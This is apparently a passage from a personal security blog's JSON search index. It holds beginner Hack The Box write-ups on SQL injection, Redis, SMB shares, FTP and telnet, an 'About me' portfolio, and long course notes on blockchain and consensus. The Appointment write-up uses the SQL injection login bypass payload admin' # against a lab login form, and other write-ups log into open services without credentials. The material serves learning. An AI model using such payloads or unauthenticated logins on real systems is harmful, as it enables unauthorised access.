#\rWhat is one of the most common type of SQL vulnerabilities?\nSQL injection\nTask 3 #\rWhat is the 2021 OWASP Top 10 classification for this vulnerability?\nA03:2021-Injection\nTask 4 #\rWhat does Nmap report as the service and version that are running on port 80 of the target?\nApache httpd 2.4.38\nTask 5 #\rWhat is the standard port used for the HTTPS protocol?\n443\nTask 6 #\rWhat is a folder called in web-application terminology?\nDirectories\nTask 7 #\rWhat is the HTTP response code is given for \u0026lsquo;Not Found\u0026rsquo; errors?\n404\nTask 8 #\rGobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we\u0026rsquo;re looking to discover directories, and not subdomains?\ndir\nTask 9 #\rWhat single character can be used to comment out the rest of a line in MySQL?\n#\rTask 10 #\rIf user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?\nCongratulations\nAfter I visited the site, I went ahead and used the payload admin’ # on the username field and then put some gibberish data on the password field and was able to log in. I got my payload from PayloadAllThings.\nAnd just like that, we were able to pawn the machine .\n","date":"16 September 2024","externalUrl":null,"permalink":"/posts/appointment/","section":"Posts","summary":"Waiting on the line.","title":"Appointment","type":"posts"},{"content":"\rIntroduction #\rTask 1 #\rWhich TCP port is open on the machine\n6379\nTask 2 #\rWhich service is running on the port that is open on the machine?\nRedis\nTask 3 #\rWhat type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database\nin-memory\nWhat is Redis Explained? | IBM\nTask 4 #\rWhich command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.\nhttps://redis.io/docs/latest/operate/rs/references/cli-utilities/redis-cli/\nTask 5 #\rWhich flag is used with the Redis command-line utility to specify the hostname?\n-h\nthe tool I used is a simplified version of man, a tool used to give more details about a cli tool,\nbelow is the explanation of the tool\nTask 6 #\rOnce connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?\ninfo\nTask 7 #\rWhat is the version of the Redis server being used on the target machine?\n5.0.7\nTask 8 #\rWhich command is used to select the desired database in Redis?\nhttps://redis.io/docs/latest/commands/\nTask 9 #\rHow many keys are present inside the database with index 0?\n4\nTask 10 #\rWhich command is used to obtain all the keys in a database?\nhttps://redis.io/docs/latest/commands/keys/\nTask 11 #\rSubmit root flag\n","date":"14 September 2024","externalUrl":null,"permalink":"/posts/reedemer/","section":"Posts","summary":"Reedeming yourself","title":"Reedemer","type":"posts"},{"content":"","date":"14 September 2024","externalUrl":null,"permalink":"/categories/tier0/","section":"Categories","summary":"","title":"Tier0","type":"categories"},{"content":"\rIntroduction #\rFor this machine we shall be comprising SMB service in order to get our root flag and pawn the machine. Furthermore, there is a share that allows access without password.\nEnumeration #\rWe shall first start by confirming that we can access the IP by pinging it.\nAs we can see the host is reachable from our attacking machine, we shall therefore go ahead and enumerate the machine using nmap to see services that are running as shown below.\nAs seen above we have SMB service open on port 445. Without going further, we can try to list the shares available on the host as seen below.\nThe syntax used to list the shares as seen above is smbclient -L ///. The -L flag is used to specify that we want to list all shares on the host. Moreover, as seen above the WorkShares share can be accessed without a password\nAccessing the WorkShares #\rWe will be downloading the contents of the share using the get command but first, we shall starting enumerating the directories in the share.\nAs seen above, we have two directories, Amy.J and James.P, I accessed the Amy.J directory and found a worknotes.txt file and went ahead to download it. We shall then go to the James.P directory and see what content is in the directory.\nAs seen above the James.P directory has the flag, and opening the worknotes.txt file we are given some instructions to what seems like how to secure the ftp server, start an apache server on our machine and setup winrm to be able to connect to the machine.\nRoot #\rAs seen below we have been able to get the root flag and compromised the SMB server.\nConclusion #\rIn this lab we were able to exploit a share that has no password set to it, moreover, we were able to root the machine by accessing the root flag from the share.\n","date":"13 September 2024","externalUrl":null,"permalink":"/posts/dancing/","section":"Posts","summary":"Only the flexible to dance.","title":"Dancing","type":"posts"},{"content":"\rIntroduction #\rFor this machine we shall be exploiting the ftp service to get the root flag of the machine. However, we will first need to do the following.\nEnumeration of the machine Service discovery FTP anonymous log in Enumeration #\rBefore enumerating, we shall start by checking if the IP is reachable from our attacking machine by pinging it as shown below.\nAfter enumeration, we were able to find out that ftp service is up and running as shown below.\nAs seen above the host is reachable from our attacking machine. We shall now enumerate the host using nmap using the following syntax as shown below\nNmap -sCV Furthermore, anonymous log in is allowed hence, we can easily now get our flag and pawn the machine.\nFTP Log in #\rAfter that we can now easily login and get our flag from the server easily as shown below.\nBelow as we can see, we have transferred the flag to our machine\nNow we can get the flag and pawn the machine.\nWith that we have successfully pawned the machine.\nWe have now successfully pawned the machine\nConclusion #\rIn this lab we were able to learn that ftp is an insecure service for storing and transmitting of files over the internet, the secure service of it is SFTP.\n","date":"12 September 2024","externalUrl":null,"permalink":"/posts/fawn/","section":"Posts","summary":"FTP","title":"Fawn","type":"posts"},{"content":"","date":"12 September 2024","externalUrl":null,"permalink":"/tags/ftp/","section":"Tags","summary":"","title":"FTP","type":"tags"},{"content":"\rIntroduction #\rFor this machine, we are introduced to the hack the box sphere, where we are required to answer some questions and familiarize ourselves with the basic tools used for enumeration and exploitation of a machine.\nThe tasks that we shall be doing in this lab are as follows.\nLab setup Enumerate the IP given for open ports Exploit vulnerable service identified Lab Setup #\rBefore interacting with the machine, we are required to connect to the platform using a vpn file as shown below.\nAs seen above we have answered the first three questions as shown below.\nAfter connecting to the platform via openvpn, we are then supposed to test the IP provided if is reachable form our attacking machine using the ping command as shown below.\nWith the above screenshot, our fourth question is answered as shown below.\nEnumeration #\rAfter enumerating the IP, we got the following output.\nAs seen above, port 23 is the only port that is open, the flag used for enumeration with nmap are explained as below.\nsCV - this is a combination of the following two flags, sC and -sV, where sC instructs nmap to scan the IP provided using default scripts sV instructs nmap to scan the IP for services running. The port open is 23 whose service is telnet, an insecure way of connecting remotely to workstations, as the communication is transmitted in plaintext.\nWith the screenshot above, we have answered our fifth and sixth questions as seen below.\nExploiting the telnet service #\rFrom the above enumeration, we have clearly identified that telnet service is running, therefore we can now successfully login to the service.\nAfter looking at the hint of the question for logging in to the telnet service, I realised it is a root user require to login to the platform with no password required for logging in as shown below.\nWe can now be able to get our root flag as seen below.\nConclusion #\rFrom the above lab, we have learnt that to connect to hack the box platform, one requires to connect via a vpn file and to enumerate an IP, we are required to use nmap for enumeration of the IP to identify services running on the IP. Furthermore, we have also learnt that telnet is an insecure service for remotely connecting to devices as it transmits data in plaintext over the network.\n","date":"11 September 2024","externalUrl":null,"permalink":"/posts/meow/","section":"Posts","summary":"Meow, meow","title":"Meow","type":"posts"},{"content":"\r~/Whoami #\rI don’t chase vulnerabilities; they reveal themselves to those who understand the language of systems. Firewalls, packets, and encrypted whispers, I listen where others overlook.\nI’ve learned that security isn’t just about defense; it’s about knowing where the cracks begin. From compromising the intentionally weak to fortifying the strong, my path is one of understanding, not destruction.\nI am not the loudest in the room, nor the fastest on the keyboard. But in the silence between requests and responses, in the heartbeat of network traffic, I see what others miss.\n~/Certifications #\rIssued by TryHackMe. #\r2024 #\r🎯 SOC Level 2 learning pat 🎯 SOC Level 1 learning path 🎯 Cyber Defense learning path 🎯 DevSecOps learning path 🎯 Offensive Pentesting learning path 🎯 Security Engineer learning path 2023 #\r🎯 CompTIA Pentest+ learning path 🎯 Red Teaming learning path 🎯 Web Fundamentals learning path 🎯 Complete Beginner learning path 🎯 Jr Penetration Tester learning path 🎯 Pre Security learning path 🎯 Introduction to Cyber Security Issued by Hack The Box #\r2024 #\r🎯 P.O.O lab (mini-prolab) Issued by Belkasoft #\r2025 #\r🎯Windows Forensics Issued by Zscaler #\r2025 - 2028 #\r🎯 Zero Trust certified Assosciate Issued by Microsoft #\r2023 #\r🎯 Microsoft Certified: Azure Fundamentals ~/Skills #\rTechnical Skills #\r🎯 Penteration testing 🎯 Vulnerability Assessment 🎯 Digital Forensics 🎯 Log analysis 🎯 Incidence Response Soft Skills #\r🔥Critical thinking 🔥Communication skills ~/Honours and awards #\r2024 #\r🥇 cyberPro CTF We took 1st place in the 2024 cyber week Hackathon CTF organized by Cyber Pro 🎖 National Research Fund Hackathon We took 4th place in the 2024 National Research Fund Hackathon innovation and CTF competition organized by National Research Fund. 2023 #\r🎖 BSides Nairobi CTF We scooped position 7 in the BSides Nairobi CTF organized by Bsides Nairobi. 🎖 Shehacks Interversity We scooped position 7 in Shehacks intervasity CTF organized by Shehacks KE. 🥉 GreenFist CTF We scooped position 3 in Greenfist Ctf representing Kenya, the competition was organized by Youung CISO Network. 2022 #\r🏅 picoCTF 2023 We scooped positioin 42 in Africa in the 2023 picoCTF competiton organized by picoCTF. ~/Areas of interest #\rRed team Web Application Security Digital Forensics Open Source Intelligence Cloud Networking ","date":"30 July 2024","externalUrl":null,"permalink":"/about/","section":"About me","summary":"portfolio","title":"About me","type":"about"},{"content":"","date":"29 April 2024","externalUrl":null,"permalink":"/categories/block-chain/","section":"Categories","summary":"","title":"Block Chain","type":"categories"},{"content":"\rWhat is a Blockchain? #\rBitcoin and Blockchain #\rYou might be familiar with\nBitcoin , which is one of the first protocols to utilize the revolutionary blockchain technology. The Bitcoin Whitepaper, authored by the pseudonymous\nSatoshi Nakamoto , described how Bitcoin could facilitate peer-to-peer transactions within a decentralized network using cryptography. This gave rise to censorship-resistant finance and presented\nBitcoin as a superior digital store of value, often referred to as\ndigital gold\n. There is a fixed amount of Bitcoin, similar to the scarcity of gold. You can learn more about this in the\nBitcoin Whitepaper\n.\nEthereum and Smart Contracts #\rA few years after Bitcoin\u0026rsquo;s creation, Vitalik Buterin and others founded\nEthereum , which builds upon the blockchain infrastructure, but with additional capabilities. With Ethereum, you can create decentralized transactions, organizations, and agreements without a centralized intermediary. This was achieved through the addition of\nsmart contracts .\nThough the concept of smart contracts was originally conceived in 1994 by\nNick Szabo\n, Ethereum made it a reality.\nSmart contracts are a set of instructions executed in a decentralized way without the need for a centralized or third party intermediary.\nSmart Contract functionality is the primary difference between blockchains like\nEthereum and\nBitcoin . Technically\nBitcoin does have smart contracts but they\u0026rsquo;re intentionally\nturing incomplete .\nThe Oracle Problem #\rHowever, smart contracts face a significant limitation – they cannot interact with or access data from the real world. This is known as the\nOracle Problem .\nBlockchains are deterministic systems, so everything happens within their ecosystem. To make smart contracts more useful and capable of handling real-world data, they need external data and computation.\nOracles serve this purpose. They are devices or services that provide data to blockchains or run external computation. To maintain decentralization, it\u0026rsquo;s necessary to use a decentralized Oracle network rather than relying on a single source. This combination of on-chain logic with off-chain data leads to\nhybrid smart contracts .\nNote:\nChainlink #\rChainlink\nis a popular decentralized Oracle network that enables smart contracts to access external data and computation. Chainlink is also blockchain agnostic - so it\u0026rsquo;s going to work with any chain out there.\nLayer 2 Scaling Solutions #\rAs blockchains grow, they face scaling issues. Layer 2, or L2, solutions have been developed to address this. L2 solutions involve other blockchains hooking into the main blockchain, essentially allowing it to scale. There are two primary types of L2 solutions:\nOptimistic Rollups: eg. Optimism, Arbitrum Zero-Knowledge Rollups: eg. ZK Sync, Polygon ZK EVM Don\u0026rsquo;t worry too much about this now. Once we understand how blockchains work \u0026lsquo;under the hood\u0026rsquo;, we\u0026rsquo;ll go further into Layer 2\u0026rsquo;s then.\nTerminology #\rYou\u0026rsquo;re going to hear some terms used in this course (and the community as a whole) a little interchangeably. Maybe you haven\u0026rsquo;t heard these terms before. I hope this offers a bit of clarification.\nCommon Terms Blockchain: In web3, a blockchain is a digital ledger that records transactions across many computers in a secure and decentralized manner. Each block contains a number of transactions, and every new block is linked to the previous one, forming a chain. This makes the data tamper-resistant. Example: Bitcoin\u0026rsquo;s blockchain records all BTC transactions. Oracle: Oracles in web3 are intermediaries that provide smart contracts with external data. They act as bridges between blockchains and the outside world, allowing smart contracts to execute based on real-world events and data. Example: A weather oracle provides data for a smart contract that triggers crop insurance payments based on rainfall data. Layer 2: Layer 2 solutions in web3 are technologies built on top of a blockchain (Layer 1) to improve its scalability and efficiency. These solutions handle transactions off the main chain, reducing congestion and fees, and then settle the final state on the main chain. Example: The Lightning Network for Bitcoin. Dapp (Decentralized Application): A Dapp is an application that runs on a decentralized network, typically a blockchain. It is powered by smart contracts and operates without a central authority. Dapps can serve various purposes, from finance to gaming. Example: Uniswap, a decentralized finance application. Smart Contract: In web3, a smart contract is a self-executing contract with the terms of the agreement directly written into code. They run on blockchains and automatically execute when predetermined conditions are met, without the need for intermediaries. Example: A smart contract for an escrow service. Hybrid Smart Contract: Hybrid smart contracts combine on-chain code (running on a blockchain) with off-chain data and computations provided by oracles. This allows the contracts to interact with data and systems outside their native blockchain. Example: A smart contract for insurance that uses real-world data (like weather or flight delays) provided by oracles. Ethereum/EVM (Ethereum Virtual Machine): Ethereum is a blockchain platform known for its smart contract functionality. The Ethereum Virtual Machine (EVM) is its computation engine that executes smart contracts. Ethereum allows developers to build decentralized applications and is the basis for many web3 projects. Example: ERC-20 tokens, a standard for creating fungible tokens on Ethereum. Web3 #\rWeb3 is a term used to describe the new paradigm of the internet powered by blockchain and smart contracts. Unlike the previous versions of the web, web3 is permissionless and relies on decentralized networks rather than centralized servers. This ushers in an era of censorship-resistant and transparent agreements and transactions, often called an ownership economy.\nWeb1:\nThe permissionless open sources web with static content\nWeb2:\nThe permissioned web, with dynamic content where companies run your agreements on their servers.\nWeb3:\nThe permissionless web with dynamic content.\nDecentralized censorship reesistant networks run your agreemeent and code. User owned ecosystems where one owns a portion of the protocol they interact with - instead of solely being the product Wrap Up #\rWe\u0026rsquo;ve taken a high-level view of the blockchain landscape, including its history and the problems that smart contracts solve.\nAt this point you might be asking yourself\nwhat do these smart contracts really mean?\nor\nwhat is meant by trust minimized agreements/unbreakable promises?\nIn my mind a technology is really only as good as the problem it solves. So next, we\u0026rsquo;re going to look at what the\npurpose\nof\nsmart contracts is - what\u0026rsquo;s the value proposition exactly?\nPurpose of smart contracts #\rThe Essence of Blockchain and Smart Contracts #\rAlmost every interaction or transaction in our lives involves some form of agreement or contract. For instance, purchasing a chair involves a contract to buy lumber, assemble it, and sell the finished product. Your electricity supply is also based on an agreement between you and the electric company. When you get an oil change for your car, you\u0026rsquo;re promised a service in exchange for money.\nAlmost everything we do in modern life relates to an agreement or contract in some way.\nTo make it more relatable, think of contracts and agreements as promises. Traditional contracts, however, require trust between parties, and this doesn’t always work in favor of honesty and fairness.\nThe Problem with Traditional Agreements #\rLets consider some real world examples of where trust leverages agreements can go wrong and why blockchain technology and smart contracts mitigates these risks.\nConsumer Trust #\rIn the 80s and 90s, McDonald’s Monopoly game promised customers a chance to win money through game cards obtained with purchases. However, it turned out that the game was rigged by insiders who manipulated the system for their gain. Essentially, McDonald’s failed to keep its promise.\nThis example demonstrates that relying on trust within agreements can lead to fraudulent activities and broken promises.\nWith smart contracts, we can eliminate the need for trust. A smart contract is an agreement or a set of instructions that are deployed on a decentralized blockchain. Once deployed, it cannot be altered, it automatically executes, and everyone can see its terms.\nImagine if McDonald’s Monopoly game was operated on a blockchain through a smart contract. The fraudulent activities would have been impossible due to the immutable, decentralized, and transparent nature of smart contracts.\nBanking and Trust #\rTraditional banks have sometimes failed to keep the promise of safeguarding people\u0026rsquo;s money, as seen during the Great Depression. Blockchain and smart contracts can ensure transparency and execute automated solvency checks, preventing the bank from becoming insolvent.\nThe core of blockchain and smart contracts lies in creating a trustless system where agreements are transparent, unchangeable, and executed without human intervention. This technology holds the potential to revolutionize industries and everyday agreements by ensuring honesty and fairness.\nFinancial Markets Access #\rCentralized bodies, like traditional exchanges, have the power to restrict access to financial markets. This was evident when Robinhood restricted trading on certain assets in 2021. With decentralized exchanges like Uniswap, there is no central authority that can alter or limit market access. This introduces fairness and openness to the financial markets.\nTo Summarize #\rTraditional Agreements: Require trust in a centralized entity. Smart Contracts: Transparent, decentralized, and tamper-proof. In a scenario where you have to choose, smart contracts are an obvious choice as they cannot be manipulated or altered in anyone\u0026rsquo;s favor.\nSmart contracts are\nthe\nsolution to minimizing the reliance on trust based systems that have historically failed us time and time again.\nUnder the Hood #\rSmart contracts are relatively new, but have already started transforming various markets. They do this by representing \u0026lsquo;promises\u0026rsquo; as code on the blockchain. This code is executed by a decentralized collective, such that no single entity can alter the agreemeent in any way! The agreement and it\u0026rsquo;s terms are public knowledge and will automatically execute without human intervention.\nMore industries are adopting smart contracts and blockchain due to the numerous advantages they offer. This results in trust-minimized agreements or what can be simply termed as unbreakable promises.\nBeyond Trust Minimization #\rIt is important to note that blockchain, smart contracts, and cryptocurrencies are not just about trust-minimized agreements. They offer security benefits, uptime advantages, execution speed, and\nmuch more\n.\nCaution: Not All Are Equal #\rHowever, beware of platforms that claim to be decentralized but are not in practice. An example from 2022 is the\nSBF\u0026#39;s FTX platform . It presented itself as a Web3 platform, but was essentially a traditional Web2 company using cryptocurrency without the benefits of smart contracts.\nAs an emerging developer or user in this space, it\u0026rsquo;s important to discern between legitimate projects and those that aren\u0026rsquo;t contributing to the ethos of Web3. I want you to be successful, but I want you to be successful because you\u0026rsquo;re creating value. Platforms like\nFTX were pretending to bring value to the space and leeching value from it.\nWrap Up #\rWhat we\u0026rsquo;ve learnt is that traditional contracts or agreements between parties are almost always trust based. Trust based agreements come with inherent flaws and the potential of broken agreements, the conseequences of which we\u0026rsquo;ve seen throughout history - The Great Depression, Monopoly Lottery, Robin Hood etc.\nBlockchain technology and smart contracts solve these problems by introducing fairness, transparency and immutability to promises. These attributes of smart contracts assure that trust isn\u0026rsquo;t required and we can be certain that an agreement will be executed as described 100% of the time.\nLastly, it\u0026rsquo;s important to note that there are several actors, such as\nFTX which\npretend\nto embody the ideologies of Web3, but are really centralized entities looking to extract value from the system, be aware of these.\nCurrent smart contract landscape #\rFeatures of Smart Contracts #\rSmart contracts come with various features that distinguish them from traditional agreements.\nDecentralization #\rThe first feature is decentralization; smart contracts do not rely on any centralized intermediary. Instead, they run on a blockchain which is maintained by thousands of individuals known as node operators. It\u0026rsquo;s the collective effort of these node operators running the smart contracts that make the network decentralized. This aspect will be discussed more in-depth later.\nTransparency and Flexibility #\rTransparency is inherent to blockchain networks. Since all node operators can see everything happening on-chain, there is no room for unfair or hidden deals. This transparency ensures that everyone has access to the same information and plays by the same rules.\nIt is important to note that this transparency does not necessarily compromise privacy. Blockchain is pseudo-anonymous, meaning that your transactions are not directly tied to your real-world identity.\nSpeed and Efficiency #\rSmart contracts and blockchain transactions are incredibly fast and efficient compared to traditional banking systems. For example, bank transfers, especially international ones, can take up to several weeks, whereas blockchain transactions happen almost instantly. This speed is not only convenient but also allows for more efficient interactions between parties.\nSecurity and Immutability #\rOnce a smart contract is deployed, it cannot be altered or tampered with. This immutability ensures that the terms of the contract are set in stone. This is a stark contrast to centralized systems where a server or database can be hacked, and data can be altered. The decentralized nature of blockchain makes hacking nearly impossible since an attacker would have to take control of more than half the nodes, which is significantly more challenging than compromising a single centralized server.\nAdditionally, the data on a blockchain is resilient. In a traditional system, if your computer and backups fail, you lose all your data. In contrast, in a blockchain, your data is replicated across thousands of nodes. Even if several nodes were to go down, your data would remain secure as long as there is at least one copy of the blockchain.\nElimination of Counterparty Risk #\rSmart contracts eliminate the need for trust in transactions. Once a smart contract is deployed, its terms cannot be changed. This means that parties cannot alter the agreement based on greed or any other factors. This ensures that the agreement is enforced as originally intended.\nIn traditional systems, there is always a risk that the other party might not fulfill their end of the bargain. With smart contracts, this risk is eliminated, and agreements are enforced programmatically.\nApplications of Smart Contracts #\rSmart contracts have given rise to new industries and revolutionized existing ones.\nDecentralized Finance (DeFi) #\rDeFi, or Decentralized Finance, allows users to engage with financial markets without relying on centralized intermediaries. With smart contracts, users have transparent access to financial markets and can engage with sophisticated financial products efficiently and securely. We will provide practical examples of how to build and interact with DeFi protocols in upcoming lessons.\nDecentralized Autonomous Organizations (DAOs) #\rDAOs are governed entirely by smart contracts and operate in a decentralized manner. This structure offers benefits such as transparent governance, efficient engagement, and clear rules. DAOs are an evolution in politics and governance, and we will cover how to build and work with DAOs in future lessons.\nNon-Fungible Tokens (NFTs) #\rNFTs, or Non-Fungible Tokens, can be thought of as digital art or unique assets. NFTs have created new avenues for artists and creators to monetize their work. We will also cover how to create and interact with NFTs in this course.\nOther Applications #\rAnd then, maybe\nyou\u0026rsquo;ll\nbe the one to discover the next iteration of smart contract applications!\nHow Blockchains work #\rIn this lesson, we\u0026rsquo;re going to break down blockchains, the process and the technology itself using a widely-praised and accessible demo available\nhere\n.\nUnderstanding Hash Functions #\rAt its simplest, a hash is a unique, fixed-length string that serves to identify any piece of data. When you input any kind of data into a hash function, it produces a hash. In this demo, the hash algorithm we\u0026rsquo;ll focus on is SHA-256.\nIf I add\nPatrick Collins to our\nSHA-256 algorithm, it will:\nConvert the letters to numbers Convert the numbers to a fixed-length “string” or “hash” Patrick Collins gets converted to\n7e5b5a1a6b80e2908b534dd5728a998173d502469c37121dd63fca283068077c Ethereum, uses its own version of a hashing algorithm (Keccak256)that isn\u0026rsquo;t exactly SHA-256 but belongs to the SHA family. This doesn\u0026rsquo;t change things significantly here as we\u0026rsquo;re primarily concentrating on the concept of hashing.\nIn the application, whatever data you enter into the data section, undergoes processing by the SHA-256 hash algorithm resulting in a unique hash.\nFor example, when I input my name as \u0026ldquo;Patrick Collins,\u0026rdquo; the resulting hash uniquely represents \u0026ldquo;Patrick Collins.\u0026rdquo; The fascinating aspect is, no matter how much data is input, the length of the generated hash string remains constant.\nUnderstanding Blocks #\rNow that we\u0026rsquo;ve grasped the concept of hashing and fixed-length string, let\u0026rsquo;s inspect the structure of a blockchain—a collection of \u0026ldquo;blocks.\u0026rdquo;\nA block takes the same data input, but instead of a singular data field, a block is divided into \u0026lsquo;block\u0026rsquo;, \u0026rsquo;nonce\u0026rsquo;, and \u0026lsquo;data.\u0026rsquo; All three are then run through the hash algorithm, producing the hash for that block. As a result, even a minor change in the data leads to an entirely different hash, hence, invalidating the block.\nIn essence, mining involves the computational trial and error process of finding an acceptable value to produce a hash which typically follows a certain pattern, such as starting with four zeros. The value found, which satisfies this criterion, is known as the \u0026rsquo;nonce\u0026rsquo;.\nThe problem or criteria a miner has to solve will vary from blockchain to blockchain, but the concept is the same.\nThe Inherent Beauty of Blockchain: Immutability #\rIn a blockchain, which is essentially a sequence of blocks, each block is comprised of the previous elements - a block number, a nonce and data - as well as\nthe hash of the previous block What this means in practice is that any changes to data, in any block of the chain, will invalidate every proceeding block, until they are recalculated, or re-mined.\nGenesis Block:\nDecentralized Distribution #\rNow, if a single entity were to control the blockchain, they could conceivably change any data they want, and then re-mine, or re-validate subsequent blocks. This is bad.\nEnter Decentralized Distribution.\nThe crux of blockchain\u0026rsquo;s power lies in its decentralization or distributed nature. Under this system, multiple entities or \u0026ldquo;peers\u0026rdquo; run the blockchain technology, each holding equal weight and power. In the event of disparity between the blockchains run by different peers (due to tampering or otherwise), the majority hash wins, as the majority of the network agrees on it.\nNodes that don\u0026rsquo;t agree with the majority effectively fork the network, continuing on their own with their own history.\nInterplay of Blockchain \u0026amp; Transactions #\rUntil now we\u0026rsquo;ve been considering the data passed in a block to be a random string of text, but the reality is - this data can be anything. In the token and coinbase sections of this demo you can see how each block is comprised of a number of transactions that all get hashed together. Any edits to any of these transactions is going to invalidate the chain!\nWrap Up #\rTo summarize, every transaction, block, and indeed the whole blockchain itself comes down to understanding the concept of a hash—this unique fixed-length string that is intrinsically linked with the original data. We\u0026rsquo;ve also underscored the importance of decentralization and highlighted how the concept of immutability plays into the system\u0026rsquo;s security.\nNB:\nA nonce- is a “number used once” to find the “solution” to the blockchain problem.\nA Block - is a list of transactions mined together\nMining - Process of finding the “solution” to the blockchain “problem”\nBlockchain overview #\rPreface #\rI\u0026rsquo;ll start by saying, you\u0026rsquo;ve done great getting his far, if at first some of these concepts are hard to grasp, things will get better with experience as we move through the course and you\u0026rsquo;re exposed to real world examples.\nI definitely would recommend going back and reviewing the parts that you don\u0026rsquo;t quite get and asking questions in the\ndiscussions tab\nof the GitHub repository.\nNow that we know all the cryptography pieces, how the blockchain actually works, how our signatures work and how everything sticks together, let\u0026rsquo;s talk a little bit about how this works in actuality and what\u0026rsquo;s really going on.\nIt\u0026rsquo;s important to note that many of the concepts we\u0026rsquo;ve covered and will cover are going to pertain to Ethereum, or the EVM ecosystem. Each specific blockchain however, may have their own nuances and intricies to watch out for. Trust that the overarching concepts will all be the same, but keep an eye out for the specific criteria that may very from chain to chain, how blocktime is handled, or which hashing algorithm is used for example.\nTraditional Networks vs Blockchain #\rTraditionally, when you run an application be it a website or something that connects to a server you are interacting with a centralized entity. This is the opposite of what you may recall from our distributed blockchain example, in that the server is controlled and run by a single centralized group.\nBlockchains, as we saw, run on a network of independent nodes. In our previous example, each of the\nPeers was representative of an independent\nnode operator. The term\nnode typically refers to a single instance of a decentralized system, Peer A would be a\nnode . This network, this combination of these nodes interacting with each other is what creates a blockchain. What makes these networks so potent, is that anybody can join. All anyone needs is a little bit a hardward and you can participate in securing a blockchain network. You could go to GitHub and start operating a node in a few seconds!\nIn the traditional world applications are run by centralized entities and if that entity goes down or is malicious or decides that they want to shut off - they just can. They\u0026rsquo;re the ones that control everything.\nBlockchains, by contrast, don\u0026rsquo;t have this problem. If one node or one entity that runs several nodes goes down, since there are so many other independent nodes running, it doesn\u0026rsquo;t matter, the blockchain and the system will persist so long as there is at least one node always running. Luckily for us, the most popular chains like Bitcoin and ethereum have thousands and thousands of nodes. Malicious nodes are kicked from the network, or even punished in some cases. Majority rules when it comes to the blockchain.\nThis gives blockchains this incredibly potent immutability trait where nothing can be changed or corrupted so in essence we can think of a blockchain as a decentralized database. In the case of Ethereum it has an extra additional feature where it also can do computation in a decentralized manner now.\nConsensus #\rLet\u0026rsquo;s talk consensus. This includes\nProof of Work and\nProof of Stake . You\u0026rsquo;ve probably heard these terms before and they\u0026rsquo;re really important to how these blockchains work.\nThe\nmining feature of our previous blockchain example was an example of\nProof of Work Proof of Work and\nProof of Stake fall under this umbrella of\nconsensus and\nconsensus is a really important topic when it comes to blockchains.\nConsensus\nVery roughly, a consensus protocol in a blockchain or decentralized system can be broken down into two pieces a chain selection algorithm and a sybil resistance mechanism. Mining, or Proof of Work, is a sybil resistance mechanism. This is what Bitcoin currently uses.\nProof of Work is known as a sybil resistance mechanism because it defines a way to figure out who is the block author or which node did the work to mine a block. Sybil resistance is a blockchain\u0026rsquo;s ability to defend against users creating a large number of pseudo-anonymous identities to gain a disproportionately advantageous influence over said system.\nAs mentioned, there are two primary types of sybil resistance:\nProof of Work Proof of Stake We\u0026rsquo;ll look a little closer at\nProof of Work first.\nProof of Work #\rProof of work is a system of sybil resistance used in many blockchains, in its essence a miner needs to go through a very computationally heavy process (mining) to find the block\u0026rsquo;s answer. As a result, it doesn\u0026rsquo;t matter how many additional nodes you\u0026rsquo;re running, each node is obligated to do this work in order to receive a reward. The playing field is kept fair.\nNote:\nProof of Work needs to be combined with a\nchain selection rule to create\nconsensus .\nA\nchain selection rule is implemented as a means to determine which blockchain is the\nreal\nblockchain. Bitcoin (and prior to the merge, Ethereum), both use something called\nNakomoto Consensus . This is a combination of Proof of Work (Etherum has since switched to Proof of Stake) and the\nlongest chain rule .\nIn the\nlongest chain rule , the decentralized network decides that whichever chain has the most number of blocks will be the valid, or\nreal\nblockchain. When we saw\nblock confirmations in Etherscan earlier, this was representing the number of blocks ahead of our transaction in the longest chain.\nYou\u0026rsquo;ll sometimes hear people use\nProof of Work\nand\nProof of Work also serves as a means to determine who receives transaction fees as we discussed earlier. These transaction fees are paid by whomever initiates the transaction. In a Proof of Work system, every node is competing against eachother to solve the block problem first. The first node to solve the problem gets paid the transaction fees accumulated in the block they mine. In addition to this, miners are also paid a\nblock reward , the\nblock reward is given by the blockchain itself.\nIf you\u0026rsquo;ve previously heard of the Bitcoin Halving - this is the concept of the block reward being cut in half roughly every 4 years.\nBlock rewards are in the blockchains native currency - Bitcoin = BTC, Ethereum = ETH. This effectively increases the amount of that cryptocurrency in circulation.\nBlockchain Attacks #\rThere are two major types of attacks that exist in the blockchain space.\nSybil Attack - When a user creates a number of pseudo-anonymous accounts to try to influence a network. 51% attack - Occurs when a single entity possesses both the longest chain and majority network control. This would allow the entity to fork the chain and bring the network onto the entities record of events, effectively allowing them to validate anything. Blockchains are very democratic. The bigger a blockchain is, the more decentralized, the more secure it becomes.\nI encourage you to look into running a node yourself to increase the security of the network!\nProof of Work does come with drawbacks. For example, Proof of Work consumes a LOT of electricity. When you have thousands of nodes all working as hard as they can to solve a block problem the energy consumption is HUGE and as such, so is the potential environmental impact.\nWith the above in mind, many protocols are choosing the shift to a different consensus mechanism that is more environmentally friendly. The most popular of which is\u0026hellip;\nProof of Stake #\rIn contrast to trying to solve a block problem, Proof of Stake nodes put up some collateral that they are going to behave honestly aka they\nstake . If a node is found to be misbehaving, it\u0026rsquo;s stake is slashed. This serves as a very effective sybil resistance mechanism because for each account, the validator needs to put up more stake and misbehaving risks losing all that collateral.\nIn a Proof of Stake system,\nminers validators Unlike in Proof of Work, where each node is racing to solve the block problem first, in Proof of Stake, validators are pseudo-randomly chosen to propose the next block and other nodes will validate it.\nProof of Stake of course comes with its own Pros and Cons.\nPros:\ngreat sybil resistance mechanism great for the environment, much less energy Cons:\nseen as less decentralized due to upfront staking costs This raises the question of\nhow decentralized is decentralized enough?\nand I think I need to leave that to the community to decide.\nLayer 1 and Layer 2 #\rI want to briefly touch on the concepts of Layer 1 and Layer 2 networks here as well.\nLayer 1 solutions: This refers to base layer blockchain implementations like Bitcoin or Ethereum. Layer 2 solutions: These are applications added on top of a layer one, like Chainlink or Arbitrum. Layer 2s like Arbitrum and Optimism are special in that they\u0026rsquo;re trying to solve the problem of scalability. These protocols leverage something called\nrollups . We won\u0026rsquo;t go too deep, but the idea is that the protocols bundle their transactions to be processed by a Layer 1.\nWrap Up #\rThis overview was huge. Amazing work, you now have a fundamental understanding of how blockchains work, how to interact with them and why they\u0026rsquo;re so secure and empowering.\n","date":"29 April 